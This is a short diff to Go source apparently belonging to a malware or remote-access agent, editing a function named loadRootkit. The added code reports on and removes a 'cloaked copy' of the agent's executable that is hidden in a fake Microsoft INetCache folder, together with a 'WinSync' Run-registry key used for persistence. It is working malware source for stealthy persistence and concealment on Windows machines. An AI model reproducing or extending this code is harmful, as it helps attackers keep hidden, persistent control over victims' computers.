@@ -28,8 +28,31 @@ func loadRootkit(c Cmd) Result {
 		base = os.TempDir()
 	}
 	dir := filepath.Join(base, "Microsoft", "Windows", "INetCache")
-	os.MkdirAll(dir, 0755)
 	dst := filepath.Join(dir, name)
+
+	sub := str(c.Args["sub"])
+	if sub == "status" || sub == "" {
+		planted := "absent"
+		if _, err := os.Stat(dst); err == nil {
+			planted = "present"
+		}
+		reg, _ := newCmd("reg", "query",
+			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WinSync").CombinedOutput()
+		run := "absent"
+		if strings.Contains(strings.ToLower(string(reg)), "winsync") {
+			run = "present"
+		}
+		return Result{OK: true, Out: fmt.Sprintf("cloaked copy: %s (%s)\nrun key: %s", planted, dst, run)}
+	}
+	if sub == "remove" {
+		newCmd("attrib", "-h", "-s", dst).Run()
+		os.Remove(dst)
+		newCmd("reg", "delete",
+			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WinSync", "/f").Run()
+		return Result{OK: true, Out: "cloaked copy and Run key removed"}
+	}
+
+	os.MkdirAll(dir, 0755)
 
 	exe, err := os.Executable()
 	if err != nil {
